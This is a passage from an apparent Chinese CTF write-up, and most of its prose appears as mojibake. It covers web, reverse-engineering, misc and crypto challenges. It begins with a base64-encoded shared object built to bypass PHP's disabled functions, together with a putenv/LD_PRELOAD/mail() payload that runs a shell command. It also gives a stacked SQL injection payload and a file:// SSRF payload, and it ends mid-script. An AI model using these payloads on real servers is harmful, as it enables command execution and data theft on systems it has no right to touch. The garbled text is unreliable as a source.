AAAABkAAAAAAAAACAkgAAAAAAAbAAAAAAAAABAAAAAAAAAAGgAAAAAAAAAYCSAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAALgBAAAAAAAABQAAAAAAAADAAwAAAAAAAAYAAAAAAAAA+AEAAAAAAAAKAAAAAAAAAMoAAAAAAAAACwAAAAAAAAAYAAAAAAAAAAMAAAAAAAAAGAsgAAAAAAACAAAAAAAAAHgAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAwAUAAAAAAAAHAAAAAAAAANAEAAAAAAAACAAAAAAAAADwAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAALAEAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAigQAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoCSAAAAAAAAAAAAAAAAAAAAAAAAAAAAB2BgAAAAAAAIYGAAAAAAAAlgYAAAAAAACmBgAAAAAAALYGAAAAAAAAWAsgAAAAAABHQ0M6IChEZWJpYW4gNC45LjItMTArZGViOHUyKSA0LjkuMgAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAudGV4dAAuZmluaQAucm9kYXRhAC5laF9mcmFtZV9oZHIALmVoX2ZyYW1lAC5pbml0X2FycmF5AC5maW5pX2FycmF5AC5qY3IALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQCQAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgC4AQAAAAAAAAAAAAAAAAAAAAAAAAMAAwD4AQAAAAAAAAAAAAAAAAAAAAAAAAMABADAAwAAAAAAAAAAAAAAAAAAAAAAAAMABQCKBAAAAAAAAAAAAAAAAAAAAAAAAAMABgCwBAAAAAAAAAAAAAAAAAAAAAAAAAMABwDQBAAAAAAAAAAAAAAAAAAAAAAAAAMACADABQAAAAAAAAAAAAAAAAAAAAAAAAMACQA4BgAAAAAAAAAAAAAAAAAAAAAAAAMACgBgBgAAAAAAAAAAAAAAAAAAAAAAAAMACwDABgAAAAAAAAAAAAAAAAAAAAAAAAMADABgCAAAAAAAAAAAAAAAAAAAAAAAAAMADQBpCAAAAAAAAAAAAAAAAAAAAAAAAAMADgCECAAAAAAAAAAAAAAAAAAAAAAAAAMADwCgCAAAAAAAAAAAAAAAAAAAAAAAAAMAEAAICSAAAAAAAAAAAAAAAAAAAAAAAAMAEQAYCSAAAAAAAAAAAAAAAAAAAAAAAAMAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAMAEwAoCSAAAAAAAAAAAAAAAAAAAAAAAAMAFADoCiAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFgBYCyAAAAAAAAAAAAAAAAAAAAAAAAMAFwBgCyAAAAAAAAAAAAAAAAAAAAAAAAMAGAAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAGQAAAAIACwDABgAAAAAAAAAAAAAAAAAALgAAAAIACwAABwAAAAAAAAAAAAAAAAAAQQAAAAIACwBQBwAAAAAAAAAAAAAAAAAAVwAAAAEAFwBgCyAAAAAAAAEAAAAAAAAAZgAAAAEAEQAYCSAAAAAAAAAAAAAAAAAAjQAAAAIACwCQBwAAAAAAAAAAAAAAAAAAmQAAAAEAEAAICSAAAAAAAAAAAAAAAAAAuAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAzQAAAAEADwAACQAAAAAAAAAAAAAAAAAA2wAAAAEAEgAgCSAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAA5wAAAAEAFgBYCyAAAAAAAAAAAAAAAAAA9AAAAAEAEwAoCSAAAAAAAAAAAAAAAAAA/QAAAAEAFgBgCyAAAAAAAAAAAAAAAAAACQEAAAEAFQAYCyAAAAAAAAAAAAAAAAAAHwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAMwEAACAAAAAAAAAAAAAAAAAAAAAAAAAATwEAABAAFgBgCyAAAAAAAAAAAAAAAAAAVgEAABIADABgCAAAAAAAAAAAAAAAAAAAXAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAcAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAfwEAABEAAAAAAAAAAAAAAAAAAAAAAAAAlAEAABAAFwBoCyAAAAAAAAAAAAAAAAAAmQEAABAAFwBgCyAAAAAAAAAAAAAAAAAApQEAABIACwDABwAAAAAAAJ0AAAAAAAAArQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAwQEAABEAAAAAAAAAAAAAAAAAAAAAAAAA2AEAACAAAAAAAAAAAAAAAAAAAAAAAAAA8gEAACIAAAAAAAAAAAAAAAAAAAAAAAAADgIAABIACQA4BgAAAAAAAAAAAAAAAAAAFAIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAHJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjY2NzAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGJ5cGFzc19kaXNhYmxlZnVuYy5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBnZXRlbnZAQEdMSUJDXzIuMi41AF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfZWRhdGEAX2ZpbmkAc3lzdGVtQEBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBlbnZpcm9uQEBHTElCQ18yLjIuNQBfZW5kAF9fYnNzX3N0YXJ0AHByZWxvYWQAX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfX2Vudmlyb25AQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AHN0cnN0ckBAR0xJQkNfMi4yLjUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAAHAAAAAgAAAAAAAACQAQAAAAAAAJABAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAuAAAA9v//bwIAAAAAAAAAuAEAAAAAAAC4AQAAAAAAADwAAAAAAAAAAwAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAOAAAAAsAAAACAAAAAAAAAPgBAAAAAAAA+AEAAAAAAADIAQAAAAAAAAQAAAACAAAACAAAAAAAAAAYAAAAAAAAAEAAAAADAAAAAgAAAAAAAADAAwAAAAAAAMADAAAAAAAAygAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABIAAAA////bwIAAAAAAAAAigQAAAAAAACKBAAAAAAAACYAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7//28CAAAAAAAAALAEAAAAAAAAsAQAAAAAAAAgAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA';var_dump(file_put_contents('/var/tmp/helloworld.so',base64_decode($a))); 2. åˆ©ç”¨soæ–‡ä»¶ç»•è¿‡è¢«bançš„å‡½æ•°æŠŠsoæ–‡ä»¶ä¼ ä¸Šå»åå…¶å®å¯ä»¥ç»§ç»­ä¼ é¡¹ç›®é‡Œçš„é‚£ä¸ªphpçš„, ä¸è¿‡è¿˜æ˜¯æƒ³è¯•è¯•èƒ½ä¸èƒ½ç›´æ¥åœ¨payloadé‡Œé¢å®ç°. å…¶å®ä¹Ÿä¸éš¾, å…ˆè®¾ç½®éœ€è¦æ‰§è¡Œçš„å‘½ä»¤/readflag &gt; /var/tmp/K1rit0, å†è®¾ç½®ç¯å¢ƒå˜é‡LD_PRELOADçš„å€¼ä¸ºåˆšåˆšä¼ ä¸Šå»çš„helloworld.so, ç„¶åè°ƒç”¨mail(). è¿™ä¸ªæ—¶å€™å°±ä¼šå†/tmpä¸‹ç”Ÿæˆä¸€ä¸ªK1rit0, é‡Œé¢å°±æ˜¯/readflagçš„ç»“æœäº†! æ‰€ä»¥payloadä¸º: 1c=var_dump(putenv(&quot;EVIL_CMDLINE=/readflag &gt; /var/tmp/K1rit0&quot;));var_dump(putenv(&quot;LD_PRELOAD=/var/tmp/helloworld.so&quot;));var_dump(mail(' ',' ',' ',' '));var_dump(file_get_contents('/var/tmp/K1rit0')); babysqlçœŸçš„å¾ˆbaby, queryè¯­å¥ç›´æ¥ç»™å‡ºæ¥äº†.å‚è€ƒè‡ªå·±çš„å¦å¤–ä¸€ä¸ªå‘å°±èƒ½åšäº†æŸç¯‡sqlæ€»ç»“ å½“æ—¶æƒ³éƒ½æ²¡æƒ³ç›´æ¥å †å æ³¨å…¥äº†(ä»¥è‡³äºä»¥ä¸ºè¿™é¢˜è¿‡æ»¤éƒ½æ²¡æœ‰,å…¶å®selectè¿™äº›è¿˜æ˜¯è¢«è¿‡æ»¤æ‰äº†çš„1';show databases;show tables # ç›´æ¥çˆ†å‡ºåº“åå’Œè¡¨åäº†1';desc flag # çˆ†å‡ºå­—æ®µåç„¶åå°±å‘ç°ç‰¹æ®Šå­—ç¬¦ä¸²enjoy_Sq1i11_qu3ryy åŒ…è£¹ctf{}æäº¤äº† babyssrfç™½ç»™ç™½ç»™ åˆ©ç”¨file://åè®®, æç¤ºè¯´çš„å¾ˆæ¸…æ¥šäº†å°±åœ¨/flag payload: ?url=file:///flag OSINTcheckinæœå•Šæœæœå•Šæœ, çœŸçš„æ˜¯æœå‡ºæ¥çš„flagå“¦(æŒ‰ç€æç¤ºæœå°±è¡Œäº† REVERSE å› ä¸ºæœ¬èº«å°±æ˜¯ä¸ºäº†æ‹¿åˆ†æ‰åšçš„RE, æ‰€ä»¥wpå°±æ¯”è¾ƒç®€çŸ­äº†(çœŸä¸æƒ³å†™hhh å¯ä»¥å»çœ‹çœ‹Misakaå¤§ä½¬çš„wp æ‰è¿·è—Idaæ‰“å¼€æ–‡ä»¶, éšä¾¿ç¿»äº†ç¿», å‘ç° æ ¹æ®è¯­ä¹‰æ‰‹åŠ¨æ‹¼å›flag basic_hashæˆ‘å°±åªä¼šF5! è¿˜å¥½ä¸»å‡½æ•°å¾ˆç®€å•, å°±æ˜¯è¦æ±‚åšé¢˜äººåˆ©ç”¨å¼‚æˆ–è¿ç®—çš„ç‰¹ç‚¹A+B+B = Aè¿˜åŸä¸¤ä¸ªmd5å€¼,ç„¶åæ‰”åˆ°æŸMD5çˆ†ç ´ç½‘ç«™è·å¾—flag.æŠŠidaä¸­çš„ä¸¤ä¸ªå­—ç¬¦ä¸²çš„å€¼æ‰‹åŠ¨è¾“å…¥åˆ°è„šæœ¬ä¸­,è·‘è„šæœ¬å°±å®Œäº‹äº† 1234567891011121314151617v9 = [70, -121, -115, 4, -67, 52, 126, 42, 113, 114, 79, 91, -61, -63, 6, -14]v26 = [59, -87, 103, -122, -46, -112, 104, -30, -92, 113, 125, -85, -14, 41, -24, 31]mask = 0b11111111for i in range(len(v9)): if v9[i] &lt; 0: v9[i] = abs(v9[i] ^ mask) - 1for i in range(len(v26)): if v26[i] &lt; 0: v26[i] = abs(v26[i] ^ mask) - 1input1_md5 = ''.join([hex(i ^ 0x30)[2:].zfill(2) for i in v9])input2_md5 = ''.join([hex(i ^ 0x20)[2:].zfill(2) for i in v26])print(input1_md5)print(input2_md5) è¿™æ ·å°±æ‹¿åˆ°ä¸¤ä¸ªMD5äº† 1276b7bd348d044e1a41427f6bf3f136c21b8947a6f2b048c284515d8bd209c83f æ‰”è¿›ç½‘ç«™, å¾—åˆ°flag ByteCodeå› ä¸ºçˆ½å“¥è¯´å¾ˆç®€å•, æ‰€ä»¥æˆ‘å°±æ¥çœ‹çœ‹, ç™¾åº¦äº†ä¸€ä¸‹ByteCode. çŸ¥é“æ˜¯å°±æ˜¯ä¸€å †æ“ä½œä¹‹å. æ‰¾åˆ°ByteCodeå’Œæ“ä½œçš„å¯¹åº”è¡¨! æ‹¿å‡ºçº¸ç¬”! ç‚¹å¼€è®¡ç®—æœº! ä¸€ç‚¹ä¸€ç‚¹æ‰‹åŠ¨å¾€å›ç®—â€¦(æ‰‹åŠ¨ç®—çš„æ„Ÿè§‰é’ˆä¸æˆ³ç®—å®Œasciiç å…¨éƒ¨è½¬æˆå­—ç¬¦ä¸²å°±æ˜¯flagäº† Misc è¯´å®è¯æ²¡æƒ³åˆ°Miscè¿™ä¹ˆå¤šé¢˜, ä¸è¿‡Miscåšèµ·æ¥å°±æ„Ÿè§‰åƒçŒœè°œä¸€æ ·, ä¹ŸæŒºæœ‰è¶£çš„. çœŸÂ·ç­¾åˆ°ä¸äºæ˜¯æˆ‘æœ€æ‹¿æ‰‹çš„ç­¾åˆ°é¢˜.ç§’è§£flag 2333 Look_at_your_keyboardé¢˜ç›®éƒ½è¯´äº†çœ‹é”®ç›˜å’¯. 1ewazx tyugv iuhbvghj uhb iujmn iuhbvghj yhnmki vgyhnji é”®ç›˜ä¸Šæ˜¯æ€æ ·çš„å°±æ€æ ·çš„(æ‰€ä»¥åšçš„æ—¶å€™è§‰å¾—Sæ˜¯8, Iæ˜¯1çš„è‚¯å®šä¸æ˜¯æˆ‘ä¸€ä¸ªå§!ç»“æœæ˜¯ctfisfun, å¯¹ç€é”®ç›˜çœ‹å°±èƒ½çœ‹å‡ºæ¥äº†. Buddhaä¹Ÿæ²¡å•¥å¥½è¯´çš„.æ–°ä½›æ›°-&gt;base64-&gt;æ …æ å¯†ç  Do you know Xp0intç”¨è®°äº‹æœ¬æ‰“å¼€å›¾ç‰‡.ç”¨çœ¼ç›ä¸€è¡Œä¸€è¡Œçš„çœ‹æœ‰æ²¡æœ‰flagæœç´¢ctf{ ç»“æœå•¥éƒ½æ²¡æœ{ å°±æ‰¾åˆ°flagäº†. ä¼¼ä¹æœ‰ä¸ªå¯ä»¥è·‘å‡ºæ–‡ä»¶ä¸­å‡ºç°çš„å­—ç¬¦ä¸²çš„è„šæœ¬ close_basebase64è§£ç å‘ç°æ˜¯Cè¯­è¨€æºç  (è¾“å‡ºä¸æ˜¯hello,world, å·®è¯„!ä¼°è®¡æ˜¯base64éšå†™äº†, æ¯•ç«Ÿæ¯ä¸€è¡Œbase64ç¼–ç ç»“å°¾éƒ½æœ‰ç­‰å·, è‚¯å®šèƒ½è—å¾ˆå¤šä¸œè¥¿2333æ‰€ä»¥base64éšå†™æ˜¯å•¥?è¿™é‡Œä¸å†™äº†â€¦ç›´æ¥ä¸Šè„šæœ¬ 123456789101112131415161718192021222324252627282930def bin2text(Bin): Hex = hex(int(Bin, 2))[2:] if len(Hex) % 2: Hex = '0' + Hex return ''.join([chr(int(b, 16)) for b in [Hex[i:i + 2] for i in range(0, len(Hex), 2)]])table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'res = ''with open('base.txt', 'r') as f: base = f.readlines()for i in range(len(base)): base[i] = base[i][::-1][1:5][::-1]for i in base: tmp = '' for j in i: if j != '=': o = bin(table.index(j))[2:] tmp += '0' * (6 - len(o)) + o tmp = tmp + '0' * (24 - len(res)) if '==' in i: res += tmp[8:12] elif '=' in i: res += tmp[16:18]flag = 'ctf{' + bin2text(res) + '}'print(flag) è¾“å‡ºçš„å°±æ˜¯flagäº†(å…·ä½“åŸç†çœŸçš„åˆ°å¤„éƒ½æœ‰çš„,æ‰¾å°±å®Œäº‹äº† PMGBAåšçš„æœ€è¿‡ç˜¾çš„ä¸€é¢˜(ä½†æ˜¯è¢«è‡ªå·±è ¢åˆ°äº† å¼€å±€ä¸€å¼ å›¾, æ–‡ä»¶å…¨é æ‹†.è¯´å®è¯ä¸€å¼€å§‹æ‹¿åˆ°å›¾æ„Ÿè§‰æŒºç†Ÿæ‚‰çš„, å°±æ˜¯è®°ä¸èµ·æ¥è¿™æ˜¯ä»€ä¹ˆâ€¦ç›´åˆ°å»ç™¾åº¦PMGBAçš„æ„æ€æ‰çŸ¥é“æ˜¯å®å¯æ¢¦.è¿™ä¸å°±æ˜¯æˆ‘ä¸Šå­¦æœŸç»ƒçº§åˆ·çš„æ€ªå—! æˆ‘ä¹Ÿç®—æ˜¯åŠå¹´çš„å®å¯æ¢¦è€ç©å®¶äº†(ä¿Šå¼ºæ‰æ˜¯å®å¯æ¢¦å¤§å¸ˆ!é©¬ä¸Šè·‘å»é—®ä¿Šå¼ºâ€ä¸Šå­¦æœŸæˆ‘åˆ·ç­‰çº§åˆ·çš„é‚£ä¸ªæœ‰26ä¸ªå½¢æ€çš„å­—æ¯æ€ªå«ä»€ä¹ˆâ€â€˜æœªçŸ¥å›¾è…¾â€™ é©¬ä¸Šå»æ‰¾å›¾é‰´, å¯¹åº”å›¾é‰´å¾—åˆ°å­—ç¬¦ä¸²remember to examine the.ä¸€å¼€å§‹æ‹¿åˆ°è¿™ä¸ªæˆ‘è¿˜ä»¥ä¸ºå°±æ˜¯æƒ³è®©æˆ‘æ£€æŸ¥è¿™å¼ å›¾ç‰‡çš„æ„æ€(é¬¼çŸ¥é“è¿™æ˜¯flagçš„å‰åŠéƒ¨åˆ†å•Šå–‚ æ‰”binwalkè·‘äº†ä¸€ä¸‹å‘ç°ç¡®å®ä¸æ­¢ä¸€å¼ å›¾ç‰‡.ç”±äºè¢«foremostå‘è¿‡æ‰€ä»¥èƒ½æ‰‹åŠ¨åˆ†æ–‡ä»¶å°±æ‰‹åŠ¨åˆ†äº†. ç”¨winhexæ‰“å¼€å›¾ç‰‡, å¯¹ç…§è¿™æ–‡ä»¶å¤´æ–‡ä»¶å°¾, åˆ†å‡ºäº†ä¸‰å¼ å›¾(åŒ…æ‹¬æœ€å¼€å§‹çš„æœªçŸ¥å›¾è…¾ æœ€å¼€å§‹æ³¨æ„åˆ°çš„å…¶å®æ˜¯ç¬¬ä¸‰å¼ å›¾, è¿™æ˜¯æˆ‘ç¬¬ä¸€ä¸ªç»ƒåˆ°5vçš„å®å¯æ¢¦, å¡è’‚ç‹—!æ‹–è¿›Stegsolveåˆ†ææ²¡æœ‰ä»€ä¹ˆç»“æœå. å†³å®šçœ‹çœ‹æ˜¯ä¸æ˜¯LSB. äºæ˜¯åˆæŠŠå¡è’‚ç‹—æ‰”è¿›zsteg, å‡ºæ¥äº†ä¸€ä¸²å­—ç¬¦ä¸²â€™pwd is 58growliness\\nâ€™. å¯†ç æ˜¯58growliness? ä¸çŸ¥é“è¿™ä¸ªå¯†ç æ˜¯ä¸ªå•¥ç›´åˆ°ä»ç¬¬äºŒå¼ å›¾é‡Œåˆ†å‡ºæ®µbase64, è§£ç åå‘ç°æ˜¯ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…. å¯†ç å°±æ˜¯58growliness é‡Œé¢ä¸€ä¸ªtxt, å†…å®¹å…¨æ˜¯pi ka chuçš„ç»„åˆ 1pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi.... åé¢è¿˜æœ‰å¾ˆå¤š çŒœæµ‹æ˜¯æŸç§åŠ å¯†, ä½†æ˜¯å´æœä¸åˆ°.ä½†åé¢æ‰¾åˆ°ä¸€ç¯‡å¤§æ¦‚è®²çš„æ˜¯ç”¨çš®å¡ä¸˜è¯­ç¼–ç¨‹çš„æ–‡ç« , å¤§æ¦‚å†…å®¹å°±æ˜¯å¥—ç”¨brainfuckçš„è¯­æ³•æ¥ç¼–ç¨‹. æ‰€ä»¥æ¥è¯•è¯•çœ‹æ˜¯ä¸æ˜¯brainfuck. æ ¹æ®å­—ç¬¦å‡ºç°çš„é¢‘ç‡è‡ªå·±å¼ºè¡Œè„‘éƒ¨å›äº†å¯¹åº”è¡¨(dalaoè¯´githubä¸Šæœ‰! 123456789dit={ 'pi':'+', 'ka':'-', 'chu':']', 'pika':'[', 'pipi':'&gt;', 'pichu':'&lt;', 'pikachu':'.', } è¿˜åŸå›brainfuckä»£ç åè¿è¡Œå¾—åˆ°çš„ç»“æœä¸ºfoo bar äº‹å®ä¸Šæ‹¼æ¥å‰é¢çš„remember to examine the foo bar å°±æ˜¯flagäº†.ä½†æˆ‘å´æ²¡æœ‰æƒ³åˆ°â€¦(è°æƒ³çš„åˆ°å•Šæ‰€ä»¥ä¸€ç›´å¡ç€ä¸çŸ¥é“flagæ˜¯å•¥.ç›´åˆ°å‘¨ä¸€é©¬å…‹æ€è¯¾æƒ³ç€éšä¾¿è¯•ä¸€ä¸‹, æ‰æäº¤æˆåŠŸâ€¦(correctå‡ºæ¥çš„æ—¶å€™äººéƒ½å‚»äº†..è¿˜æ˜¯è„‘æ´ä¸å¤Ÿå¤§å— é›†é½äº”é¾™ç ä¸€å¤§å †çš„æ–‡ä»¶, åå­—å…¨éƒ½æ˜¯base64. æƒ³çœ‹çœ‹å…¨éƒ¨è§£ç ä¼šä¸ä¼šæœ‰ä»€ä¹ˆçº¿ç´¢.å†™äº†ä¸ªè„šæœ¬æ¥è§£ç  123456789import osfrom base64 import b64decodebase = 'problem/'filenames = []for root, ds, fs in os.walk(base): for f in fs: print(f, b64decode(f).decode('utf-8', 'ignore')) # è¾“å‡ºæ–‡ä»¶åå’Œè§£ç ä¹‹åçš„æ–‡ä»¶å æœç„¶é‡Œé¢æœ‰äº”ä¸ªå¾ˆç‰¹æ®Šçš„æ–‡ä»¶, è§£ç ä¹‹åæ˜¯æ­£å¸¸çš„å­—ç¬¦ä¸².å°±æ˜¯åç¼€å¸¦oneçš„æ–‡ä»¶(å…¶ä»–çš„æ˜¯åé¢è§£é¢˜çš„æ–‡ä»¶ winhexæ‰“å¼€first_oneå’Œlast!_one å‘ç°ä¼¼ä¹æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…è¢«æ‹†æˆäº”ä»½äº†.å°è¯•è¿˜åŸå›å», ä½†æ˜¯ä¸çŸ¥é“ä¸­é—´ä¸‰ä¸ªå‹ç¼©åŒ…çš„é¡ºåº. äºæ˜¯å†™äº†ä¸ªè„šæœ¬æ¥æ‰‹åŠ¨å°è¯•(å› ä¸ºå°±3ä¸ªæ–‡ä»¶å°±8ç§ç»„åˆ, è‡ªå·±è°ƒæ¢é¡ºåºå°±è¡Œäº†. 123456789101112131415161718192021filename = { 'fi': 'first_one', 'fu': 'funny_one', 'la': 'last!_one', 'sm': 'smart_one', 'cu': 'cute__one'}files = {}for i in filename: with open(filename[i], 'rb') as f: files[i] = f.read()# file =files['fi']+files['fu']+files['cu']+files['sm']+files['la']# file =files['fi']+files['fu']+files['sm']+files['cu']+files['la']# file =files['fi']+files['sm']+files['fu']+files['cu']+files['la']# file =files['fi']+files['sm']+files['cu']+files['fu']+files['la']file = files['fi'] + files['cu'] + files['sm'] + files['fu'] + files['la']with open('out.zip', 'wb') as f: f.write(file) å°è¯•åˆ°ç¬¬äº”ä¸ªçš„æ—¶å€™å‹ç¼©åŒ…å°±èƒ½æ­£å¸¸çš„è§£å‹äº†.è§£å‹å‡ºæ¥ä¸€ä¸ªflagæ–‡ä»¶, winhexæ‰“å¼€å‘ç°æ–‡ä»¶å¤´æ˜¯jpgçš„æ–‡ä»¶å¤´.åç¼€æ”¹æˆjpgåæ‰“å¼€ Crypto æœ€å–œæ¬¢çš„å¯†ç å­¦! è¿™æ¬¡æƒ³ç€è¦åšå®Œå¯†ç çš„, å¯æƒœæœ€åä¸€é“é¢˜æ²¡æœ‰åšå‡ºæ¥. æœ‰è¶£çš„åŠ å¯†å¤ªéš¾äº†, é™„ä»¶åªæœ‰ä¸€æ®µåƒbaseçš„ç¼–ç , æ²¡ä»€ä¹ˆæ€è·¯â€¦.. ç¢°ç¢°è½¦è¿™é¢˜æ„Ÿè§‰å°±åƒæ˜¯proof_of_workâ€¦å•çº¯çš„çˆ†ç ´md5ç›´æ¥ä¸Šè„šæœ¬æŠŠ 1234567891011121314151617from hashlib import md5from string import printable'''md5(AGVSCF?TZV?WBGVHC?U)=a8f738??????5ea5??????80865???af'''STR1 = 'AGVSCF'STR2 = 'TZV'STR3 = 'WBGVHC'STR4 = 'U'for i in printable: for j in printable: for k in printable: STR = STR1 + i + STR2 + j + STR3 + k + STR4 if md5(STR.encode()).hexdigest().startswith('a8f738'): print(STR, md5(STR.encode()).hexdigest()) å¾—åˆ°ç»“æœa8f738a65b715ea54900b180865b20af EasyRSAè¿™é¢˜ä¹Ÿå¾ˆç®€å•. è¿ç®—ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°Nå’Œphiäº†(å¤ªç™½ç»™äº†å‘€ç„¶åæ­£å¸¸è§£rsaå°±è¡Œäº†è„šæœ¬å¦‚ä¸‹ 123456789101112131415from gmpy2 import invertfrom Crypto.Util.number import long_to_bytespandq = 20029167198807103822294848708534176719693827885584335928109682356494141073775700355124993345488062063358756812142730873692437534641839672970148348433433440p2andq2 = 208680638196054793779950396947640995086963335225314494211048436767328157403385847902708950876722819363430805183637917486948883719184952031896287718282687710627112461479842558330512185988841693609451411485248346255881435015800175737788918607504412656254312427601603342579907641505150315471704698521905016530338e = 65537c = 